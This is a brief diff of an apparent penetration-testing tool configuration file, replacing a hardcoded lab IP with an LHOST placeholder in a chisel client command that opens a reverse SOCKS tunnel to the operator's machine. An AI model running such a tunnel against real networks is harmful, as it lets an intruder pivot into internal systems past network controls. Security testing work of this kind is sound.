@@ -67,7 +67,7 @@ zip_tools:
 exe_tools:
   chisel:
     location: tools/chisel.exe
-    cmd: "client http://10.10.14.110:8443 R:1081:socks"
+    cmd: "client http://LHOST:8443 R:1081:socks"
 
 cs_tools:
   adhunttool:
